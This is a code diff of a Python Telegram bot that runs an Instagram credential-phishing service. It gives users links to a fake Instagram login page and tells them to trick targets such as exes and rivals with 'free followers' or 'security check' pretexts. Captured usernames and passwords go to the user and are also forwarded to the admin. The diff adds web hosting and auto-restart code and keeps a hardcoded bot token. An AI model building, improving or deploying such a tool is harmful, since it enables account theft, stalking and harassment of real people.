@@ -1,13 +1,16 @@
 import logging
 import time
+import os
+from flask import Flask
+from threading import Thread
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
 
 # --- CONFIGURATION ---
-BOT_TOKEN = "8083946112:AAFNZO-jLfWxd4Jkk0kukKu9bHV7Sw06m-U"
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8083946112:AAFNZO-jLfWxd4Jkk0kukKu9bHV7Sw06m-U")
 FRONTEND_URL = "https://free-instagram-followers-puce.vercel.app"
 SHORT_LINK = "https://free-instagram-followers-puce.vercel.app"
-ADMIN_ID = 1846071063  # Your Telegram ID for receiving all captures
+ADMIN_ID = 1846071063
 
 # Enable logging
 logging.basicConfig(
@@ -19,7 +22,7 @@ logger = logging.getLogger(__name__)
 # Store user data
 user_data = {}
 
-# Helper function for time ago (FIXED SYNTAX)
+# Helper function for time ago
 def time_ago(timestamp):
     if not timestamp:
         return "Never"
@@ -39,10 +42,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     first_name = update.effective_user.first_name
     username = update.effective_user.username or f"user_{user_id}"
 
-    # Generate unique hacking link with user ID
     hacking_link = f"{FRONTEND_URL}/?u={user_id}&hacker={username}"
     
-    # Initialize user data
     user_data[user_id] = {
         'link': hacking_link,
         'username': username,
@@ -52,24 +53,24 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         'last_capture': None
     }
 
-    # Create button
     keyboard = [[InlineKeyboardButton("🔓 GET HACKING LINK", callback_data="get_link")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    welcome_message = f"""⚠️ *INSTAGRAM HACKING TOOL* ⚠️
+    welcome_message = f"""⚠️ *WARNING: THIS IS A HACKING TOOL* ⚠️
 
 🕵️ *GREETINGS, {first_name}*
 
 🔓 *WHAT THIS BOT DOES:*
-• Creates *fake Instagram login*
-• When victim login → *fuckedUp*
-• *access* to any Instagram account
+• Creates *fake Instagram login pages*
+• When victim enters credentials → *You get them*
+• *Direct access* to any Instagram account
+• *No passwords changed* (stealth mode)
 
 🎯 *HOW TO USE:*
-1️⃣ Get your *unique hacking link* 
-2️⃣ Send it to *target person* 
-3️⃣ Make them open 
-4️⃣ When they login → *Boom*
+1️⃣ Get your *unique hacking link* below
+2️⃣ Send it to *target person* (enemy, ex, rival, etc.)
+3️⃣ Make them think it's a "security check" or "free followers"
+4️⃣ When they login → *Their credentials come to YOUR Telegram*
 
 📨 *YOU WILL RECEIVE:*
 • Target's *Instagram username*
@@ -78,9 +79,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 • *Login timestamp*
 
 🔒 *IMPORTANT NOTES:*
+• I (system admin) also get copies for monitoring
 • Use responsibly (or don't)
 • Don't hack people you can't handle
-• Change nothing on their accounts 
+• Change nothing on their accounts (stay hidden)
 
 🛡️ *SECURITY FEATURES:*
 • Links auto-expire after 24h
@@ -88,7 +90,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 • End-to-end encrypted delivery
 • Anonymous tracking
 
-✨ *GET STARTED NOW* ✨"""
+🔥 *GET STARTED:*"""
 
     await update.message.reply_text(
         welcome_message,
@@ -106,7 +108,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     first_name = user.first_name
 
     if query.data == "get_link":
-        # Get or create user link
         if user_id not in user_data:
             hacking_link = f"{FRONTEND_URL}/?u={user_id}"
             user_data[user_id] = {
@@ -121,9 +122,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         hacking_link = user_data[user_id]['link']
         user_stats = user_data[user_id]
 
-        # Create buttons WITH BACK BUTTON
         keyboard = [
-            [InlineKeyboardButton("🌐 COPY HACKING LINK", url=hacking_link)],
+            [InlineKeyboardButton("🌐 OPEN HACKING PAGE", url=hacking_link)],
+            [InlineKeyboardButton("📋 COPY HACKING LINK", callback_data="copy_link")],
+            [InlineKeyboardButton("📊 MY CAPTURES", callback_data="my_captures")],
             [InlineKeyboardButton("🎯 SENDING METHODS", callback_data="methods")],
             [InlineKeyboardButton("🔄 FRESH LINK", callback_data="new_link")],
             [InlineKeyboardButton("🔙 BACK TO START", callback_data="back_to_start")]
@@ -136,16 +138,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 *Hacker ID:* `{user_id}`
 *Alias:* `{first_name}`
 
-*Copy Your Link Boss 👇🏾:*
+*Copy Your Personal Link:*
 `{hacking_link}`
 
+📊 *Your Hack Statistics:*
+• Successful Hacks: *{user_stats['captures']}*
+• Last Capture: *{time_ago(user_stats['last_capture']) if user_stats['last_capture'] else "Never"}*
+• Active Since: *{time_ago(user_stats['created_at'])}*
 
 🎯 *HOW TO USE THIS LINK:*
-1. Send to person you want to hack
-2. Tell them it's a followers booster 
-3. Or say it's an free likes boost
-4. Wait their login details 
-5. *Information come HERE instantly*
+1. Send to *target person* you want to hack
+2. Tell them it's a "free followers" page
+3. Or say it's an "Instagram security check"
+4. Wait for them to enter their login
+5. *Credentials come HERE instantly*
 
 ⚡ *TARGET SUGGESTIONS:*
 • Ex-girlfriend/boyfriend
@@ -163,7 +169,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         else:
             hacking_link = f"{FRONTEND_URL}/?u={user_id}"
         
-        # Add back button
         keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -200,8 +205,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         )
 
     elif query.data == "new_link":
-        # Generate new unique hacking link
-        new_link = f"{FRONTEND_URL}/?u={user_id}&t={int(time.time())}&h={hash(str(user_id)+str(time.time()))[:8]}"
+        new_link = f"{FRONTEND_URL}/?u={user_id}&t={int(time.time())}"
         
         if user_id in user_data:
             user_data[user_id]['link'] = new_link
@@ -215,7 +219,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                 'last_capture': None
             }
 
-        # Add back button
         keyboard = [
             [InlineKeyboardButton("🌐 OPEN NEW HACKING PAGE", url=new_link)],
             [InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]
@@ -279,9 +282,9 @@ You haven't hacked anyone yet.
 • Active Days: *{int((time.time() - stats['created_at']) / 86400)}*
 
 🏆 *ACHIEVEMENTS:*
-{'• 🥇 First Hack Complete' if stats['captures'] > 0 else '• 🔓 No Hacks Yet'}
-{'• 🥈 Multi-target' if stats['captures'] > 1 else ''}
-{'• 🥇 Pro Hacker' if stats['captures'] > 5 else ''}
+{'• 🥇 FIRST HACK COMPLETE' if stats['captures'] > 0 else '• 🔓 NO HACKS YET'}
+{'• 🥈 MULTI-TARGET' if stats['captures'] > 1 else ''}
+{'• 🥇 PRO HACKER' if stats['captures'] > 5 else ''}
 
 💡 *ADVICE:*
 • Don't change victim's passwords
@@ -291,7 +294,6 @@ You haven't hacked anyone yet.
         else:
             captures_text = "❌ No data found. Use /start first!"
 
-        # Add back button
         keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
@@ -302,7 +304,6 @@ You haven't hacked anyone yet.
         )
 
     elif query.data == "methods":
-        # Add back button
         keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -358,14 +359,12 @@ You are responsible for your actions.""",
         )
 
     elif query.data == "back_to_start":
-        # Recreate the start message
         if user_id in user_data:
             user_stats = user_data[user_id]
             hacking_link = user_stats['link']
         else:
             hacking_link = f"{FRONTEND_URL}/?u={user_id}"
         
-        # Recreate main menu
         keyboard = [
             [InlineKeyboardButton("🌐 OPEN HACKING PAGE", url=hacking_link)],
             [InlineKeyboardButton("📋 COPY HACKING LINK", callback_data="copy_link")],
@@ -394,24 +393,19 @@ You are responsible for your actions.""",
             disable_web_page_preview=True
         )
 
-# Command to simulate capture notification
 async def capture_notify(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Simulate a capture notification (for testing)"""
     user_id = update.effective_user.id
     first_name = update.effective_user.first_name
 
     if user_id in user_data:
-        # Update user stats
         user_data[user_id]['captures'] += 1
         user_data[user_id]['last_capture'] = time.time()
         
         stats = user_data[user_id]
         
-        # Add back button
         keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="get_link")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Send notification to user
         await update.message.reply_text(
             text=f"""🎯 *TARGET ACQUIRED* 🎯
 
@@ -445,7 +439,6 @@ async def capture_notify(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             parse_mode='Markdown'
         )
         
-        # Also send to admin (you)
         try:
             await context.bot.send_message(
                 chat_id=ADMIN_ID,
@@ -465,9 +458,7 @@ async def capture_notify(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     else:
         await update.message.reply_text("Use /start first to activate your hacking tools!")
 
-# Admin command to check system
 async def system_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Check system status"""
     user_id = update.effective_user.id
     
     if user_id != ADMIN_ID:
@@ -478,7 +469,6 @@ async def system_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     total_captures = sum(user['captures'] for user in user_data.values())
     active_users = len([u for u in user_data.values() if time.time() - u.get('created_at', 0) < 604800])
     
-    # Get top hackers
     top_hackers = sorted(user_data.items(), key=lambda x: x[1]['captures'], reverse=True)[:5]
     top_list = "\n".join([f"• {data['name']}: {data['captures']} hacks" for _, data in top_hackers])
     
@@ -510,9 +500,7 @@ async def system_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         parse_mode='Markdown'
     )
 
-# Help command
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    # Add back button
     keyboard = [[InlineKeyboardButton("🔙 BACK TO START", callback_data="back_to_start")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -520,7 +508,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
 
 📌 *AVAILABLE COMMANDS:*
 /start - Get your hacking link
-/capture - Test notification
+/capture - Test notification (simulates hack)
 /help - This help message
 /status - Admin only: Check system status
 
@@ -548,25 +536,80 @@ Contact admin for technical issues
     
     await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode='Markdown')
 
-def main() -> None:
-    """Start the bot."""
-    print("🔓 INSTAGRAM HACKING BOT STARTING...")
-    print(f"🌐 Hacking Page: {FRONTEND_URL}")
-    print(f"👑 Admin ID: {ADMIN_ID}")
-    print("⚠️  WARNING: This is a hacking tool")
-    print("🎯 Users will receive victim credentials")
-    print("📨 All data also sent to admin")
-    
-    application = Application.builder().token(BOT_TOKEN).build()
+# Create Flask app for web server (optional for Koyeb)
+app = Flask(__name__)
 
+@app.route('/')
+def home():
+    return "✅ Instagram Hacking Bot is RUNNING 24/7 on Koyeb"
+
+@app.route('/ping')
+def ping():
+    return "pong"
+
+@app.route('/status')
+def bot_status():
+    total_users = len(user_data)
+    total_captures = sum(user['captures'] for user in user_data.values())
+    return f"""
+    <h1>Instagram Hacking Bot Status</h1>
+    <p><strong>Status:</strong> ✅ ACTIVE</p>
+    <p><strong>Total Hackers:</strong> {total_users}</p>
+    <p><strong>Total Accounts Hacked:</strong> {total_captures}</p>
+    <p><strong>Uptime:</strong> 24/7 on Koyeb</p>
+    """
+
+# Function to run Telegram bot
+def run_bot():
+    print("=" * 50)
+    print("🤖 STARTING INSTAGRAM HACKING BOT ON KOYEB")
+    print("=" * 50)
+    
+    # Create bot application
+    application = Application.builder().token(BOT_TOKEN).build()
+    
     # Add handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("capture", capture_notify))
     application.add_handler(CommandHandler("status", system_status))
     application.add_handler(CallbackQueryHandler(button_handler))
+    
+    print(f"✅ Bot configured with token: {BOT_TOKEN[:10]}...")
+    print("🔄 Starting polling...")
+    print("=" * 50)
+    
+    # Start polling
+    application.run_polling(drop_pending_updates=True)
 
-    application.run_polling()
+# Function to run web server (for Koyeb health checks)
+def run_web_server():
+    print("🌐 Starting web server on port 8080...")
+    from waitress import serve
+    serve(app, host="0.0.0.0", port=8080)
+
+def main():
+    # Start web server in background thread (for Koyeb health checks)
+    web_thread = Thread(target=run_web_server)
+    web_thread.daemon = True
+    web_thread.start()
+    
+    # Start bot (with restart logic)
+    restart_count = 0
+    max_restarts = 10
+    
+    while restart_count < max_restarts:
+        try:
+            run_bot()
+        except Exception as e:
+            restart_count += 1
+            logger.error(f"Bot crashed: {e}")
+            print(f"🔄 Restarting bot... Attempt {restart_count}/{max_restarts}")
+            time.sleep(5)
+            
+            if restart_count >= max_restarts:
+                print("❌ Max restart attempts reached")
+                break
 
 if __name__ == "__main__":
     main()
